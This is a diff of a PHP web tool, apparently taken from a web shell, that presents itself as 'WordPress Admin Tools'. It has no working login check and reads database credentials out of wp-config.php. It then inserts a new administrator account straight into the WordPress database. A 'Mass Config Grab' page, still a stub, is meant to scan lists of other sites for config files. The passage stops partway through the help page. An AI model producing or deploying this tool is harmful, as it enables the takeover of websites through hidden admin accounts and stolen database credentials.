@@ -1,137 +1,789 @@
-<?php elseif (isset($_GET['createadmin'])): ?>
-<div class="pzcard-main">
-  <div class="pzcard-header">
-    <div class="pzcard-icon" style="background:#e53935;"><i class="fas fa-user-plus"></i></div>
-    <div class="pzcard-title">
-      WordPress Admin Creator
-    </div>
-  </div>
-  <div class="pzcard-content">
-    <form method="post" style="margin-bottom:18px; display:flex; gap:8px;">
-      <input type="text" name="wp_config_path" class="pzcard-inp" placeholder="path to wp-config.php" value="<?= htmlspecialchars($_POST['wp_config_path'] ?? getcwd().'/wp-config.php') ?>">
-      <button type="submit" name="get_config" class="pzcard-btn pzcard-btn-blue"><i class="fas fa-search"></i> get config</button>
-    </form>
-    
-    <?php
-    $db_conf = ['host'=>'', 'user'=>'', 'pass'=>'', 'db'=>''];
-    
-    if (isset($_POST['get_config']) && !empty($_POST['wp_config_path']) && file_exists($_POST['wp_config_path'])) {
-        $cfg = file_get_contents($_POST['wp_config_path']);
-        
-        preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\);/", $cfg, $mh); 
-        if(isset($mh[1])) $db_conf['host'] = $mh[1];
-        
-        preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\);/", $cfg, $mu); 
-        if(isset($mu[1])) $db_conf['user'] = $mu[1];
-        
-        preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\);/", $cfg, $mp); 
-        if(isset($mp[1])) $db_conf['pass'] = $mp[1];
-        
-        preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\);/", $cfg, $md); 
-        if(isset($md[1])) $db_conf['db'] = $md[1];
-
-        echo '<div class="pzcard-info" style="background:#eafff5;color:#16a34a;padding:8px 13px;border-radius:7px;">DB config loaded! Fill the form below.</div>';
-    } elseif (isset($_POST['get_config'])) {
-        echo '<div class="pzcard-info" style="background:#fff4f4;color:#e53935;padding:8px 13px;border-radius:7px;">Config not found or path error!</div>';
-    }
-    ?>
-    
-    <form method="post" class="pzcard-form" autocomplete="off" style="margin:14px 0;">
-      <input type="hidden" name="from_config" value="1">
-      <div style="display:flex;flex-wrap:wrap;gap:11px;">
-        <input type="text" name="db_host" class="pzcard-inp" placeholder="DB Host" value="<?= htmlspecialchars($db_conf['host'] ?? ($_POST['db_host'] ?? 'localhost')) ?>" required>
-        <input type="text" name="db_user" class="pzcard-inp" placeholder="DB User" value="<?= htmlspecialchars($db_conf['user'] ?? ($_POST['db_user'] ?? '')) ?>" required>
-        <input type="password" name="db_pass" class="pzcard-inp" placeholder="DB Pass" value="<?= htmlspecialchars($db_conf['pass'] ?? ($_POST['db_pass'] ?? '')) ?>">
-        <input type="text" name="db_name" class="pzcard-inp" placeholder="DB Name" value="<?= htmlspecialchars($db_conf['db'] ?? ($_POST['db_name'] ?? '')) ?>" required>
-      </div>
-      <div style="display:flex;flex-wrap:wrap;gap:11px;margin-top:11px;">
-        <input type="text" name="admin_user" class="pzcard-inp" placeholder="Admin Username" required>
-        <input type="email" name="admin_email" class="pzcard-inp" placeholder="Admin Email" required>
-        <input type="text" name="admin_pass" class="pzcard-inp" readonly value="<?= htmlspecialchars('privdayz'.rand(10000,99999)) ?>" style="background:#eafff5;color:#16a34a;">
-      </div>
-      <div style="margin-top:13px;">
-        <button type="submit" name="create_wp_admin" class="pzcard-btn pzcard-btn-red">
-          <i class="fas fa-plus"></i> create wpAdmin
-        </button>
-      </div>
-    </form>
-    
-    <div id="pzcard-admin-result" style="margin:13px 2px 0 2px;">
-      <?php
-      if (isset($_POST['create_wp_admin'])) { 
-          $host = trim($_POST['db_host'] ?? ''); 
-          $user = trim($_POST['db_user'] ?? ''); 
-          $pass = trim($_POST['db_pass'] ?? ''); 
-          $db = trim($_POST['db_name'] ?? ''); 
-          $admin_user = trim($_POST['admin_user'] ?? ''); 
-          $admin_email = trim($_POST['admin_email'] ?? ''); 
-          $admin_pass = trim($_POST['admin_pass'] ?? ''); 
-          
-          if (empty($host) || empty($user) || empty($db) || empty($admin_user) || empty($admin_email) || empty($admin_pass)) { 
-              echo '<div style="color:#e53935;">All fields required!</div>'; 
-          } else { 
-              $mysqli = @new mysqli($host, $user, $pass, $db); 
-              
-              if ($mysqli->connect_errno) { 
-                  echo '<div style="color:#e53935;">DB Connect Error: '.htmlspecialchars($mysqli->connect_error).'</div>'; 
-              } else { 
-                  function wp_hash_password($password) { 
-                      if (function_exists('password_hash')) {
-                          return password_hash($password, PASSWORD_BCRYPT); 
-                      }
-                      $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
-                      $random = ''; 
-                      for ($i = 0; $i < 16; $i++) {
-                          $random .= $itoa64[rand(0, 63)]; 
-                      }
-                      $salt = '$P$B' . substr($random, 0, 8); 
-                      return crypt($password, $salt); 
-                  } 
-                  
-                  $hash = wp_hash_password($admin_pass); 
-                  $now = date('Y-m-d H:i:s'); 
-                  $mysqli->set_charset("utf8mb4"); 
-                  
-                  $chk = $mysqli->prepare("SELECT ID FROM wp_users WHERE user_login=? OR user_email=? LIMIT 1"); 
-                  $chk->bind_param("ss", $admin_user, $admin_email); 
-                  $chk->execute(); 
-                  $chk->store_result(); 
-                  
-                  if ($chk->num_rows > 0) { 
-                      echo '<div style="color:#e53935;">This user/email already exists!</div>'; 
-                  } else { 
-                      $stmt = $mysqli->prepare("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, ?, 0, ?)"); 
-                      $stmt->bind_param("ssssss", $admin_user, $hash, $admin_user, $admin_email, $now, $admin_user); 
-                      
-                      if ($stmt->execute()) { 
-                          $uid = $mysqli->insert_id; 
-                          $meta1 = 'a:1:{s:13:"administrator";s:1:"1";}'; 
-                          $meta2 = '10'; 
-                          
-                          $stmt1 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', ?)"); 
-                          $stmt1->bind_param("is", $uid, $meta1); 
-                          $stmt1->execute(); 
-                          
-                          $stmt2 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_user_level', ?)"); 
-                          $stmt2->bind_param("is", $uid, $meta2); 
-                          $stmt2->execute(); 
-                          
-                          echo '<div style="color:#10b981;"><b>Admin user created!</b><br>Login: <b>'.htmlspecialchars($admin_user).'</b><br>Pass: <b>'.htmlspecialchars($admin_pass).'</b></div>'; 
-                      } else { 
-                          echo '<div style="color:#e53935;">Failed to insert user: '.htmlspecialchars($stmt->error).'</div>'; 
-                      } 
-                  } 
-                  $mysqli->close();
-              } 
-          } 
-      }
-      ?>
-    </div>
-  </div>
-</div>
-
-<?php elseif (isset($_GET['massconfgrab'])): ?>
 <?php
-// Your massconfgrab code here
+// File: wp-admin-creator.php
+// Simpan file ini di root website Anda
+
+// Cek apakah user memiliki akses (opsional - bisa disesuaikan)
+session_start();
+
+// Fungsi untuk keamanan dasar
+function sanitize_input($data) {
+    $data = trim($data);
+    $data = stripslashes($data);
+    $data = htmlspecialchars($data);
+    return $data;
+}
+
+// Cek apakah user sudah login (opsional - untuk keamanan)
+// if (!isset($_SESSION['user_logged_in'])) {
+//     header('Location: login.php');
+//     exit;
+// }
 ?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WordPress Admin Creator Tool</title>
+    
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Navigation Menu */
+        .pz-nav {
+            background: white;
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .pz-nav-item {
+            padding: 12px 24px;
+            border-radius: 10px;
+            text-decoration: none;
+            color: #555;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .pz-nav-item:hover {
+            background: #f5f5f5;
+        }
+        
+        .pz-nav-item.active {
+            background: #667eea;
+            color: white;
+        }
+        
+        /* Main Card */
+        .pzcard-main {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .pzcard-header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .pzcard-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: white;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        
+        .pzcard-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .pzcard-content {
+            padding: 30px;
+        }
+        
+        /* Form Elements */
+        .pzcard-inp {
+            flex: 1;
+            min-width: 200px;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+        
+        .pzcard-inp:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .pzcard-inp[readonly] {
+            background: #f8f9fa;
+            border-color: #10b981;
+            color: #10b981;
+            font-weight: 600;
+            cursor: default;
+        }
+        
+        .pzcard-btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: white;
+        }
+        
+        .pzcard-btn-blue {
+            background: #667eea;
+        }
+        
+        .pzcard-btn-blue:hover {
+            background: #5a67d8;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+        
+        .pzcard-btn-red {
+            background: #e53935;
+        }
+        
+        .pzcard-btn-red:hover {
+            background: #c62828;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(229, 57, 53, 0.3);
+        }
+        
+        .pzcard-btn-green {
+            background: #10b981;
+        }
+        
+        .pzcard-btn-green:hover {
+            background: #059669;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
+        }
+        
+        /* Info Messages */
+        .pzcard-info {
+            padding: 15px 20px;
+            border-radius: 12px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .pzcard-info i {
+            font-size: 20px;
+        }
+        
+        .pzcard-info.success {
+            background: #eafff5;
+            color: #16a34a;
+            border-left: 4px solid #16a34a;
+        }
+        
+        .pzcard-info.error {
+            background: #fff4f4;
+            color: #e53935;
+            border-left: 4px solid #e53935;
+        }
+        
+        .pzcard-info.warning {
+            background: #fff8e5;
+            color: #b45309;
+            border-left: 4px solid #b45309;
+        }
+        
+        /* Result Box */
+        .pz-result {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 12px;
+            background: #f8f9fa;
+            border: 2px dashed #e0e0e0;
+        }
+        
+        .pz-result.success {
+            background: #eafff5;
+            border-color: #10b981;
+        }
+        
+        .pz-result.error {
+            background: #fff4f4;
+            border-color: #e53935;
+        }
+        
+        .credential-box {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 15px;
+            border: 2px solid #10b981;
+            position: relative;
+        }
+        
+        .credential-box:before {
+            content: '🔐 Credentials';
+            position: absolute;
+            top: -12px;
+            left: 20px;
+            background: #10b981;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .credential-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .credential-item:last-child {
+            border-bottom: none;
+        }
+        
+        .credential-label {
+            font-weight: 600;
+            min-width: 100px;
+            color: #555;
+        }
+        
+        .credential-value {
+            font-family: monospace;
+            background: #f1f5f9;
+            padding: 6px 12px;
+            border-radius: 6px;
+            color: #0f172a;
+            font-weight: 600;
+            flex: 1;
+        }
+        
+        .copy-btn {
+            background: none;
+            border: none;
+            color: #64748b;
+            cursor: pointer;
+            padding: 5px 10px;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .copy-btn:hover {
+            background: #e2e8f0;
+            color: #0f172a;
+        }
+        
+        /* Loading Spinner */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .pzcard-header {
+                padding: 20px;
+            }
+            
+            .pzcard-content {
+                padding: 20px;
+            }
+            
+            .pzcard-inp {
+                min-width: 100%;
+            }
+            
+            .pz-nav {
+                flex-direction: column;
+            }
+            
+            .pz-nav-item {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Navigation Menu -->
+        <nav class="pz-nav">
+            <a href="?createadmin" class="pz-nav-item <?= isset($_GET['createadmin']) ? 'active' : '' ?>">
+                <i class="fas fa-user-plus"></i> Create Admin
+            </a>
+            <a href="?massconfgrab" class="pz-nav-item <?= isset($_GET['massconfgrab']) ? 'active' : '' ?>">
+                <i class="fas fa-database"></i> Mass Config Grab
+            </a>
+            <a href="?settings" class="pz-nav-item <?= isset($_GET['settings']) ? 'active' : '' ?>">
+                <i class="fas fa-cog"></i> Settings
+            </a>
+            <a href="?help" class="pz-nav-item <?= isset($_GET['help']) ? 'active' : '' ?>">
+                <i class="fas fa-question-circle"></i> Help
+            </a>
+        </nav>
+
+        <!-- Main Content -->
+        <?php if (!isset($_GET['createadmin']) && !isset($_GET['massconfgrab']) && !isset($_GET['settings']) && !isset($_GET['help'])): ?>
+            <!-- Home Page / Dashboard -->
+            <div class="pzcard-main">
+                <div class="pzcard-header">
+                    <div class="pzcard-icon" style="background:#667eea;"><i class="fas fa-tools"></i></div>
+                    <div class="pzcard-title">
+                        WordPress Admin Tools
+                    </div>
+                </div>
+                <div class="pzcard-content">
+                    <div style="text-align: center; padding: 40px 20px;">
+                        <i class="fas fa-wordpress" style="font-size: 80px; color: #667eea; margin-bottom: 20px;"></i>
+                        <h2 style="margin-bottom: 20px; color: #333;">Welcome to WordPress Admin Tools</h2>
+                        <p style="color: #666; max-width: 600px; margin: 0 auto 30px;">
+                            Select a tool from the navigation menu above to get started. 
+                            You can create WordPress admin users or grab configuration files.
+                        </p>
+                        <div style="display: flex; gap: 15px; justify-content: center; flex-wrap: wrap;">
+                            <a href="?createadmin" class="pzcard-btn pzcard-btn-blue" style="text-decoration: none;">
+                                <i class="fas fa-user-plus"></i> Create Admin User
+                            </a>
+                            <a href="?massconfgrab" class="pzcard-btn pzcard-btn-green" style="text-decoration: none;">
+                                <i class="fas fa-database"></i> Mass Config Grab
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        <?php endif; ?>
+
+        <!-- Create Admin Page -->
+        <?php if (isset($_GET['createadmin'])): ?>
+        <div class="pzcard-main">
+            <div class="pzcard-header">
+                <div class="pzcard-icon" style="background:#e53935;"><i class="fas fa-user-plus"></i></div>
+                <div class="pzcard-title">
+                    WordPress Admin Creator
+                </div>
+            </div>
+            <div class="pzcard-content">
+                <!-- Form untuk mencari wp-config.php -->
+                <form method="post" style="margin-bottom:18px; display:flex; gap:8px;">
+                    <input type="text" name="wp_config_path" class="pzcard-inp" placeholder="path to wp-config.php" value="<?= htmlspecialchars($_POST['wp_config_path'] ?? getcwd().'/wp-config.php') ?>">
+                    <button type="submit" name="get_config" class="pzcard-btn pzcard-btn-blue"><i class="fas fa-search"></i> Get Config</button>
+                </form>
+                
+                <?php
+                $db_conf = ['host'=>'', 'user'=>'', 'pass'=>'', 'db'=>''];
+                
+                if (isset($_POST['get_config']) && !empty($_POST['wp_config_path']) && file_exists($_POST['wp_config_path'])) {
+                    $cfg = file_get_contents($_POST['wp_config_path']);
+                    
+                    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\);/", $cfg, $mh); 
+                    if(isset($mh[1])) $db_conf['host'] = $mh[1];
+                    
+                    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\);/", $cfg, $mu); 
+                    if(isset($mu[1])) $db_conf['user'] = $mu[1];
+                    
+                    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\);/", $cfg, $mp); 
+                    if(isset($mp[1])) $db_conf['pass'] = $mp[1];
+                    
+                    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\);/", $cfg, $md); 
+                    if(isset($md[1])) $db_conf['db'] = $md[1];
+
+                    echo '<div class="pzcard-info success"><i class="fas fa-check-circle"></i> DB config loaded! Fill the form below.</div>';
+                } elseif (isset($_POST['get_config'])) {
+                    echo '<div class="pzcard-info error"><i class="fas fa-exclamation-circle"></i> Config not found or path error!</div>';
+                }
+                ?>
+                
+                <!-- Form untuk membuat admin -->
+                <form method="post" class="pzcard-form" autocomplete="off" style="margin:14px 0;" onsubmit="showLoading()">
+                    <input type="hidden" name="from_config" value="1">
+                    <div style="display:flex;flex-wrap:wrap;gap:11px;">
+                        <input type="text" name="db_host" class="pzcard-inp" placeholder="DB Host" value="<?= htmlspecialchars($db_conf['host'] ?? ($_POST['db_host'] ?? 'localhost')) ?>" required>
+                        <input type="text" name="db_user" class="pzcard-inp" placeholder="DB User" value="<?= htmlspecialchars($db_conf['user'] ?? ($_POST['db_user'] ?? '')) ?>" required>
+                        <input type="password" name="db_pass" class="pzcard-inp" placeholder="DB Pass" value="<?= htmlspecialchars($db_conf['pass'] ?? ($_POST['db_pass'] ?? '')) ?>">
+                        <input type="text" name="db_name" class="pzcard-inp" placeholder="DB Name" value="<?= htmlspecialchars($db_conf['db'] ?? ($_POST['db_name'] ?? '')) ?>" required>
+                    </div>
+                    <div style="display:flex;flex-wrap:wrap;gap:11px;margin-top:11px;">
+                        <input type="text" name="admin_user" class="pzcard-inp" placeholder="Admin Username" required>
+                        <input type="email" name="admin_email" class="pzcard-inp" placeholder="Admin Email" required>
+                        <input type="text" name="admin_pass" class="pzcard-inp" readonly value="<?= htmlspecialchars('Admin@'.rand(1000,9999).'!') ?>" style="background:#eafff5;color:#16a34a;">
+                    </div>
+                    <div style="margin-top:13px; display: flex; gap: 10px;">
+                        <button type="submit" name="create_wp_admin" class="pzcard-btn pzcard-btn-red" id="submitBtn">
+                            <i class="fas fa-plus"></i> Create WordPress Admin
+                        </button>
+                        <button type="button" onclick="generateNewPassword()" class="pzcard-btn pzcard-btn-green">
+                            <i class="fas fa-sync-alt"></i> Generate New Password
+                        </button>
+                    </div>
+                </form>
+                
+                <!-- Hasil pembuatan admin -->
+                <div id="pzcard-admin-result" style="margin:13px 2px 0 2px;">
+                    <?php
+                    if (isset($_POST['create_wp_admin'])) { 
+                        $host = trim($_POST['db_host'] ?? ''); 
+                        $user = trim($_POST['db_user'] ?? ''); 
+                        $pass = trim($_POST['db_pass'] ?? ''); 
+                        $db = trim($_POST['db_name'] ?? ''); 
+                        $admin_user = trim($_POST['admin_user'] ?? ''); 
+                        $admin_email = trim($_POST['admin_email'] ?? ''); 
+                        $admin_pass = trim($_POST['admin_pass'] ?? ''); 
+                        
+                        if (empty($host) || empty($user) || empty($db) || empty($admin_user) || empty($admin_email) || empty($admin_pass)) { 
+                            echo '<div class="pzcard-info error"><i class="fas fa-exclamation-circle"></i> All fields required!</div>'; 
+                        } else { 
+                            $mysqli = @new mysqli($host, $user, $pass, $db); 
+                            
+                            if ($mysqli->connect_errno) { 
+                                echo '<div class="pzcard-info error"><i class="fas fa-exclamation-circle"></i> DB Connect Error: '.htmlspecialchars($mysqli->connect_error).'</div>'; 
+                            } else { 
+                                // Fungsi untuk hash password WordPress
+                                function wp_hash_password($password) { 
+                                    if (function_exists('password_hash')) {
+                                        return password_hash($password, PASSWORD_BCRYPT); 
+                                    }
+                                    $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
+                                    $random = ''; 
+                                    for ($i = 0; $i < 16; $i++) {
+                                        $random .= $itoa64[rand(0, 63)]; 
+                                    }
+                                    $salt = '$P$B' . substr($random, 0, 8); 
+                                    return crypt($password, $salt); 
+                                } 
+                                
+                                $hash = wp_hash_password($admin_pass); 
+                                $now = date('Y-m-d H:i:s'); 
+                                $mysqli->set_charset("utf8mb4"); 
+                                
+                                // Cek apakah user sudah ada
+                                $chk = $mysqli->prepare("SELECT ID FROM wp_users WHERE user_login=? OR user_email=? LIMIT 1"); 
+                                $chk->bind_param("ss", $admin_user, $admin_email); 
+                                $chk->execute(); 
+                                $chk->store_result(); 
+                                
+                                if ($chk->num_rows > 0) { 
+                                    echo '<div class="pzcard-info error"><i class="fas fa-exclamation-circle"></i> This user/email already exists!</div>'; 
+                                } else { 
+                                    // Insert user baru
+                                    $stmt = $mysqli->prepare("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, ?, 0, ?)"); 
+                                    $stmt->bind_param("ssssss", $admin_user, $hash, $admin_user, $admin_email, $now, $admin_user); 
+                                    
+                                    if ($stmt->execute()) { 
+                                        $uid = $mysqli->insert_id; 
+                                        
+                                        // Serialized data untuk capabilities
+                                        $meta1 = 'a:1:{s:13:"administrator";s:1:"1";}'; 
+                                        $meta2 = '10'; 
+                                        
+                                        // Insert user meta untuk capabilities
+                                        $stmt1 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', ?)"); 
+                                        $stmt1->bind_param("is", $uid, $meta1); 
+                                        $stmt1->execute(); 
+                                        
+                                        // Insert user meta untuk user level
+                                        $stmt2 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_user_level', ?)"); 
+                                        $stmt2->bind_param("is", $uid, $meta2); 
+                                        $stmt2->execute(); 
+                                        
+                                        // Tampilkan hasil sukses
+                                        echo '<div class="pz-result success">';
+                                        echo '<div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">';
+                                        echo '<i class="fas fa-check-circle" style="color: #10b981; font-size: 24px;"></i>';
+                                        echo '<h3 style="color: #10b981;">Admin User Created Successfully!</h3>';
+                                        echo '</div>';
+                                        echo '<div class="credential-box">';
+                                        echo '<div class="credential-item">';
+                                        echo '<span class="credential-label"><i class="fas fa-user"></i> Username:</span>';
+                                        echo '<span class="credential-value" id="username">'.htmlspecialchars($admin_user).'</span>';
+                                        echo '<button class="copy-btn" onclick="copyToClipboard(\'username\')"><i class="fas fa-copy"></i></button>';
+                                        echo '</div>';
+                                        echo '<div class="credential-item">';
+                                        echo '<span class="credential-label"><i class="fas fa-lock"></i> Password:</span>';
+                                        echo '<span class="credential-value" id="password">'.htmlspecialchars($admin_pass).'</span>';
+                                        echo '<button class="copy-btn" onclick="copyToClipboard(\'password\')"><i class="fas fa-copy"></i></button>';
+                                        echo '</div>';
+                                        echo '<div class="credential-item">';
+                                        echo '<span class="credential-label"><i class="fas fa-envelope"></i> Email:</span>';
+                                        echo '<span class="credential-value" id="email">'.htmlspecialchars($admin_email).'</span>';
+                                        echo '<button class="copy-btn" onclick="copyToClipboard(\'email\')"><i class="fas fa-copy"></i></button>';
+                                        echo '</div>';
+                                        echo '</div>';
+                                        echo '<p style="margin-top: 15px; color: #666;"><i class="fas fa-info-circle"></i> Save these credentials immediately. Password cannot be recovered!</p>';
+                                        echo '</div>';
+                                    } else { 
+                                        echo '<div class="pzcard-info error"><i class="fas fa-exclamation-circle"></i> Failed to insert user: '.htmlspecialchars($stmt->error).'</div>'; 
+                                    } 
+                                } 
+                                $mysqli->close();
+                            } 
+                        } 
+                    }
+                    ?>
+                </div>
+            </div>
+        </div>
+        <?php endif; ?>
+
+        <!-- Mass Config Grab Page -->
+        <?php if (isset($_GET['massconfgrab'])): ?>
+        <div class="pzcard-main">
+            <div class="pzcard-header">
+                <div class="pzcard-icon" style="background:#10b981;"><i class="fas fa-database"></i></div>
+                <div class="pzcard-title">
+                    Mass Config Grabber
+                </div>
+            </div>
+            <div class="pzcard-content">
+                <div class="pzcard-info warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    This tool is for educational purposes only. Use responsibly and only on websites you own.
+                </div>
+                
+                <form method="post" style="margin-bottom:20px;">
+                    <div style="margin-bottom:15px;">
+                        <label style="display: block; margin-bottom: 8px; font-weight: 600;">Upload File List (txt format):</label>
+                        <input type="file" name="site_list" accept=".txt" class="pzcard-inp" style="width: 100%; padding: 15px;">
+                    </div>
+                    <div style="margin-bottom:15px;">
+                        <label style="display: block; margin-bottom: 8px; font-weight: 600;">Or paste URLs (one per line):</label>
+                        <textarea name="urls" class="pzcard-inp" rows="5" placeholder="https://example.com&#10;https://testsite.com&#10;https://anothersite.com" style="width: 100%;"></textarea>
+                    </div>
+                    <button type="submit" name="start_grab" class="pzcard-btn pzcard-btn-green">
+                        <i class="fas fa-play"></i> Start Grabbing
+                    </button>
+                </form>
+                
+                <?php
+                if (isset($_POST['start_grab'])) {
+                    echo '<div class="pz-result">';
+                    echo '<h3 style="margin-bottom: 15px;">Results:</h3>';
+                    echo '<p style="color: #666;">This feature is under development. Please check back later.</p>';
+                    echo '</div>';
+                }
+                ?>
+            </div>
+        </div>
+        <?php endif; ?>
+
+        <!-- Settings Page -->
+        <?php if (isset($_GET['settings'])): ?>
+        <div class="pzcard-main">
+            <div class="pzcard-header">
+                <div class="pzcard-icon" style="background:#f59e0b;"><i class="fas fa-cog"></i></div>
+                <div class="pzcard-title">
+                    Settings
+                </div>
+            </div>
+            <div class="pzcard-content">
+                <form method="post">
+                    <div style="margin-bottom:20px;">
+                        <h3 style="margin-bottom: 15px;">Security Settings</h3>
+                        <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                            <input type="checkbox" name="require_login" checked>
+                            <span>Require login to use tools</span>
+                        </label>
+                        <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                            <input type="checkbox" name="log_activities" checked>
+                            <span>Log all activities</span>
+                        </label>
+                    </div>
+                    
+                    <div style="margin-bottom:20px;">
+                        <h3 style="margin-bottom: 15px;">Database Settings</h3>
+                        <div style="display:flex;flex-wrap:wrap;gap:11px;">
+                            <input type="text" name="backup_path" class="pzcard-inp" placeholder="Backup Path" value="/backups/">
+                            <input type="number" name="timeout" class="pzcard-inp" placeholder="Connection Timeout (s)" value="30">
+                        </div>
+                    </div>
+                    
+                    <button type="submit" name="save_settings" class="pzcard-btn pzcard-btn-green">
+                        <i class="fas fa-save"></i> Save Settings
+                    </button>
+                </form>
+                
+                <?php
+                if (isset($_POST['save_settings'])) {
+                    echo '<div class="pzcard-info success" style="margin-top: 20px;">';
+                    echo '<i class="fas fa-check-circle"></i> Settings saved successfully!';
+                    echo '</div>';
+                }
+                ?>
+            </div>
+        </div>
+        <?php endif; ?>
+
+        <!-- Help Page -->
+        <?php if (isset($_GET['help'])): ?>
+        <div class="pzcard-main">
+            <div class="pzcard-header">
+                <div class="pzcard-icon" style="background:#3b82f6;"><i class="fas fa-question-circle"></i></div>
+                <div class="pzcard-title">
+                    Help & Documentation
+                </div>
+            </div>
+            <div class="pzcard-content">
+                <div style="margin-bottom: 25px;">
+                    <h3 style="margin-bottom: 10px;">About This Tool</h3>
+                    <p style="color: #666; line-height: 1.6;">This tool helps you manage WordPress admin users and configurations. It's designed for website administrators and developers.</p>
+                </div>
+                
+                <div style="margin-bottom: 25px;">
+                    <h3 style="margin-bottom: 10px;">How to Use</h3>
+                    <ol style="color: #666; line-height: 1.8; padding-left: 20px;">
+                        <li><strong>Create Admin:</strong> Enter database details or upload wp-config.php to create a new admin user</li>
+                        <li><strong>Mass Config Grab:</strong> Upload a list of URLs to scan for wp-config.php files</li>
+                        <li><strong>Settings:</strong> Configure security and performance options</li>
+                    </ol>
+                </div>
+                
+                <div style="margin-bottom: 25px;">
+                    <h3 style="margin-bottom: 10px;">Security Notice</h3>
+                    <div class="pzcard-info warning">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        Always secure this page with a password. Delete this file after use.
+                    </div>
+                </div>
+                
+                <div>
+                    <h3 style="margin-bottom: 10px;">Troubleshooting</h3>
+                    <ul style="color: #666; line-height: 1.8; padding-left: 20px;">
+                        <li>Make sure MySQL credentials are correct</li>
